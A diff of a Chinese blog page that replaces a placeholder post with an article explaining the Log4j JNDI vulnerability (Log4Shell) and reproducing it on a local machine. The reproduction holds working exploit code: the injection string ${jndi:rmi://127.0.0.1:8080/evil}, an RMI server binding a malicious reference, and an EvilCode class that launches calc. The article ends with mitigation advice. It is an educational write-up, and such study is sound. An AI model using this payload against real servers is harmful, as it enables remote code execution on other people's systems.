@@ -4,7 +4,7 @@
   <!-- 元数据 -->
   <meta charset="utf-8">
   <link rel="icon" href="">
-  <title>hello-world | Love is a Moment Story</title>
+  <title>log4j原理分析 | Love is a Moment Story</title>
   <meta name="author" content="zhang rui" />
   <meta http-equiv="Cache-Control" content="no-transform" />
   <meta http-equiv="Cache-Control" content="no-siteapp" />
@@ -13,19 +13,20 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <meta name="format-detection" content="telphone=no, email=no" />
   
-    <meta name="keywords" content="" />
+    <meta name="keywords" content="log4j" />
   
-  <meta name="description" content="Hello, World是指在电脑屏幕显示“Hello, World!”（你好，世界！）字符串的计算机程序。相关的程序通常都是每种电脑编程语言最基本、最简单的程序，也会用作示范一个编程语言如何运作。同时它亦可以用来确认一个编程语言的编译器、程序开发环境及运行环境是否已经安装妥当。因为写法简单可见，这也是很多初学者首次接触编程语言时会撰写的程序。 成功啦o(￣▽￣)ブ  有危险Σ(っ °Д °;)っ">
+  <meta name="description" content="前言：十几天前，log4j被爆出“史诗级”漏洞。其危害非常大，影响非常广。该漏洞非常容易利用，可以执行任意代码。这个漏洞的影响可谓是重量级的。 漏洞描述：由于Apache Log4j存在递归解析功能，未取得身份认证的用户，可以从远程发送数据请求输入数据日志，轻松触发漏洞，最终在目标上执行任意代码。简单点说，就是可以通过输入一些具有特殊意义的字符来攻击服务器。 如果入侵者在前端页面上输入了：${jn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="hello-world">
-<meta property="og:url" content="http://example.com/2021/05/02/my-first-blog/index.html">
+<meta property="og:title" content="log4j原理分析">
+<meta property="og:url" content="http://example.com/2022/07/20/log4j%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="Love is a Moment Story">
-<meta property="og:description" content="Hello, World是指在电脑屏幕显示“Hello, World!”（你好，世界！）字符串的计算机程序。相关的程序通常都是每种电脑编程语言最基本、最简单的程序，也会用作示范一个编程语言如何运作。同时它亦可以用来确认一个编程语言的编译器、程序开发环境及运行环境是否已经安装妥当。因为写法简单可见，这也是很多初学者首次接触编程语言时会撰写的程序。 成功啦o(￣▽￣)ブ  有危险Σ(っ °Д °;)っ">
+<meta property="og:description" content="前言：十几天前，log4j被爆出“史诗级”漏洞。其危害非常大，影响非常广。该漏洞非常容易利用，可以执行任意代码。这个漏洞的影响可谓是重量级的。 漏洞描述：由于Apache Log4j存在递归解析功能，未取得身份认证的用户，可以从远程发送数据请求输入数据日志，轻松触发漏洞，最终在目标上执行任意代码。简单点说，就是可以通过输入一些具有特殊意义的字符来攻击服务器。 如果入侵者在前端页面上输入了：${jn">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/null">
-<meta property="article:published_time" content="2021-05-02T09:30:00.000Z">
-<meta property="article:modified_time" content="2021-08-05T07:43:48.919Z">
+<meta property="article:published_time" content="2022-07-20T09:27:04.000Z">
+<meta property="article:modified_time" content="2022-08-30T09:30:49.139Z">
 <meta property="article:author" content="zhang rui">
+<meta property="article:tag" content="log4j">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/null">
 <meta name="twitter:site" content="@null">
@@ -171,17 +172,17 @@
     <div class="kratos-hentry kratos-post-inner clearfix">
         <header class="kratos-entry-header">
             
-                <h1 class="kratos-entry-title text-center">hello-world</h1>
+                <h1 class="kratos-entry-title text-center">log4j原理分析</h1>
             
             
             <ul class="kratos-post-meta text-center">
-                <li><i class="fa fa-calendar"></i> 2021-05-02</li>
+                <li><i class="fa fa-calendar"></i> 2022-07-20</li>
                 <li><i class="fa fa-user"></i> 作者 zhang rui</li>
                 <li>
                     <i class="fa fa-edit"></i> 
                     
                     
-                        747
+                        ~2.99K
                     
                     字
                 </li>
@@ -190,38 +191,34 @@
         </header>
         <div class="kratos-post-content">
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
-                本文最后编辑于 <time datetime="1628149428919"></time> 前，其中的内容可能需要更新。
+                本文最后编辑于 <time datetime="1661851849139"></time> 前，其中的内容可能需要更新。
             </div>
             
+                <div class="kratos-post-inner-toc">
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">漏洞描述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EJNDI%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">关于JNDI：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8ERMI%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">关于RMI：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">漏洞复现：</span></a></li></ol>
+                </div>
+            
             <hr />
-            <p>Hello, World是指在电脑屏幕显示“Hello, World!”（你好，世界！）字符串的计算机程序。相关的程序通常都是每种电脑编程语言最基本、最简单的程序，也会用作示范一个编程语言如何运作。同时它亦可以用来确认一个编程语言的编译器、程序开发环境及运行环境是否已经安装妥当。因为写法简单可见，这也是很多初学者首次接触编程语言时会撰写的程序。</p>
-<div class="alert alert-success"><p>成功啦o(<em>￣▽￣</em>)ブ</p>
-</div>
-<div class="alert alert-danger"><p>有危险Σ(っ °Д °;)っ</p>
-</div>
-<div class="alert alert-info"><p>有消息(・∀・(・∀・(・∀・*)</p>
-</div>
-<div class="alert alert-warning"><p>当心哦≧ ﹏ ≦</p>
-</div>
+            <h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>十几天前，log4j被爆出“史诗级”漏洞。其危害非常大，影响非常广。该漏洞非常容易利用，可以执行任意代码。这个漏洞的影响可谓是重量级的。</p>
+<h3 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>由于Apache Log4j存在递归解析功能，未取得身份认证的用户，可以从远程发送数据请求输入数据日志，轻松触发漏洞，最终在目标上执行任意代码。简单点说，就是可以通过输入一些具有特殊意义的字符来攻击服务器。</p>
+<p>如果入侵者在前端页面上输入了：${jndi:rmi://127.0.0.1:8080/evil} 这串字符， 然后后台用log4j记录了这串字符， log4j会自动使用jndi调用这个地址上的rmi内容。如果这个rmi的内容是删除数据库，重启服务器这种恶意程序，被攻击之后还是趁早跑路吧。（开个玩笑）</p>
+<h3 id="关于JNDI："><a href="#关于JNDI：" class="headerlink" title="关于JNDI："></a>关于JNDI：</h3><p>JNDI(Java Naming and Directory Interface)是Java提供的Java 命名和目录接口。通过调用JNDI的API应用程序可以定位资源和其他程序对象。JNDI是Java EE的重要部分，需要注意的是它并不只是包含了DataSource(JDBC 数据源)，JNDI可访问的现有的目录及服务有:JDBC、LDAP、RMI、DNS、NIS、CORBA，摘自百度百科。</p>
+<h3 id="关于RMI："><a href="#关于RMI：" class="headerlink" title="关于RMI："></a>关于RMI：</h3><p>RMI（remote method invocation）即远程方法调用，是允许运行在一个java虚拟机上的对象调用运行在另外一个java虚拟机上的对象的方法，JAVA RMI实现JAVA程序之间跨越JVM的远程通信。通过RMI可以让调用远程JVM上对象方法，仿佛调用本地JVM上对象方法一样简单、快捷。</p>
+<h3 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>首先，可以先创建一个普通的maven项目， 在pom中引入log4j2.14.0</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.0&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.0&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% alertbox success &quot;成功啦o(*￣▽￣*)ブ&quot; %&#125;</span><br><span class="line">&#123;% alertbox danger &quot;有危险Σ(っ °Д °;)っ&quot; %&#125;</span><br><span class="line">&#123;% alertbox info &quot;有消息(・∀・(・∀・(・∀・*)&quot; %&#125;</span><br><span class="line">&#123;% alertbox warning &quot;当心哦≧ ﹏ ≦&quot; %&#125;</span><br></pre></td></tr></table></figure>
+<p>再创建一个用于开启RMI服务端的java文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line">import javax.naming.Reference;</span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class RMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException, AlreadyBoundException &#123;</span><br><span class="line">        LocateRegistry.createRegistry(8080);</span><br><span class="line">        final Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 8080);</span><br><span class="line">        Reference ref = new Reference(&quot;EvilCode&quot;, &quot;EvilCode&quot;, null);</span><br><span class="line">        final ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;evil&quot;, referenceWrapper);</span><br><span class="line">        System.out.println(&quot;启动成功&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<div class="xControl">
-    <div class="xHeading"><div class="xIcon"><i class="fa fa-plus"></i></div><span>折叠框的标题</span></div>
-    <div class="xContent"><div class="inner">
-        <p>被折叠的内容 1<br>被折叠的内容 2<br>…</p>
- 
-    </div></div>
-    </div>
+<p>再创建EvilCode恶意程序攻击类， 这里由于是自己的电脑， 还是用经典的calc计算器举粟</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class EvilCode &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        System.err.println(&quot;打开计算器&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% collapse 折叠框的标题 %&#125;</span><br><span class="line"></span><br><span class="line">被折叠的内容 1</span><br><span class="line">被折叠的内容 2</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#123;% endcollapse %&#125;</span><br></pre></td></tr></table></figure>
+<p>最后创建一个启动类， 用于模拟我们的服务器程序， 使用log4j打印日志</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.logging.log4j.LogManager;</span><br><span class="line">import org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    static Logger logger = LogManager.getLogger();</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //用input局部变量来模拟入侵者输入的内容</span><br><span class="line">        String input = &quot;$&#123;jndi:rmi://127.0.0.1:8080/evil&#125;&quot;;</span><br><span class="line">        //这里直接用log4j输入</span><br><span class="line">        logger.error(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
-
-<p>TYPE是面板框的类型，可以是：</p>
-<p>successs<br>danger<br>info<br>warning</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% colorpanel TYPE 面板框的标题 %&#125;</span><br><span class="line"></span><br><span class="line">面板里的内容 1</span><br><span class="line">面板里的内容 2</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#123;% endcolorpanel %&#125;</span><br></pre></td></tr></table></figure>
-
+<p>先启动RMIServer， 再启动Main， 可以看到， 计算器被弹出了：</p>
+<p><img src="https://img2020.cnblogs.com/blog/2270411/202112/2270411-20211223170600183-1405687313.png" alt="img"></p>
+<p>可以升级log4j最新版本或者更新jdk较高版本来解决这个问题</p>
 
         </div>
         
@@ -275,7 +272,7 @@
     <script type="text/javascript">
         $(()=>{
             new QRCode("wechat-qr", {
-                text: "http://example.com/2021/05/02/my-first-blog/",
+                text: "http://example.com/2022/07/20/log4j%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/",
                 width: 150,
                 height: 150,
                 correctLevel : QRCode.CorrectLevel.H
@@ -287,9 +284,10 @@
             const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
             const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
             const twitterBase   = "https://twitter.com/intent/tweet?";
-            const hostUrl       = "http://example.com/2021/05/02/my-first-blog/";
-            const title         = "「hello-world」";
-            const excerpt       = `Hello, World是指在电脑屏幕显示“Hello, World!”（你好，世界！）字符串的计算机程序。相关的程序通常都是每种电脑编程语言最基本、最简单的程序，也会用作示范一个编程语言如何运作。同时它亦可以用来确认一个编程语言的编...`;
+            const hostUrl       = "http://example.com/2022/07/20/log4j%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/";
+            const title         = "「log4j原理分析」";
+            const excerpt       = `前言：十几天前，log4j被爆出“史诗级”漏洞。其危害非常大，影响非常广。该漏洞非常容易利用，可以执行任意代码。这个漏洞的影响可谓是重量级的。
+漏洞描述：由于Apache Log4j存在递归解析功能，未取得身份认证的用户，可以从远程发...`;
             let _URL;
             switch (dest) {
                 case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
@@ -308,10 +306,10 @@
             <div class="footer-tag clearfix">
                 <div class="pull-left">
                 <i class="fa fa-tags"></i>
-                    
+                    <a class="tag-none-link" href="/tags/log4j/" rel="tag">log4j</a>
                 </div>
                 <div class="pull-date">
-                <span>最后编辑：2021-08-05</span>
+                <span>最后编辑：2022-08-30</span>
                 </div>
             </div>
         </footer>
@@ -319,10 +317,10 @@
     
         <nav class="navigation post-navigation clearfix" role="navigation">
             
-            
-            <div class="nav-next clearfix">
-                <a title=" SQL手工注入入门教程" href="/2021/08/03/渗透第一课/">下一篇 &gt;</a>
+            <div class="nav-previous clearfix">
+                <a title=" 文件上传漏洞扫描器和利用工具" href="/2022/05/04/文件上传漏洞扫描器和利用工具/">&lt; 上一篇</a>
             </div>
+            
             
         </nav>
     
@@ -331,8 +329,8 @@
 
 <script>
     var disqus_config = function () {
-        this.page.url = 'http://example.com/2021/05/02/my-first-blog/';  // Replace PAGE_URL with your page's canonical URL variable
-        this.page.identifier = '2021/05/02/my-first-blog/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        this.page.url = 'http://example.com/2022/07/20/log4j%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = '2022/07/20/log4j原理分析/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
     };
     var load_comm = () => {
         if (typeof DISQUS == 'undefined') {
@@ -344,8 +342,8 @@
             DISQUS.reset({
                 reload: true,
                 config: function () {  
-                    this.page.url = 'http://example.com/2021/05/02/my-first-blog/';  // Replace PAGE_URL with your page's canonical URL variable
-                    this.page.identifier = '2021/05/02/my-first-blog/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+                    this.page.url = 'http://example.com/2022/07/20/log4j%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/';  // Replace PAGE_URL with your page's canonical URL variable
+                    this.page.identifier = '2022/07/20/log4j原理分析/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
                 }
             });
         }
@@ -384,6 +382,18 @@
 </aside>
             
                     <div class="sticky-area">
+                
+                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix">
+    <div class="photo-background"></div>
+    <h4 class="widget-title no-after">
+        <i class="fa fa-compass"></i>
+        文章目录
+        <span class="toc-progress-bar"></span>
+    </h4>
+    <div class="textwidget">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0%EF%BC%9A"><span class="toc-text">漏洞描述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EJNDI%EF%BC%9A"><span class="toc-text">关于JNDI：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8ERMI%EF%BC%9A"><span class="toc-text">关于RMI：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A"><span class="toc-text">漏洞复现：</span></a></li></ol>
+    </div>
+</aside>
                 
                 
   <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
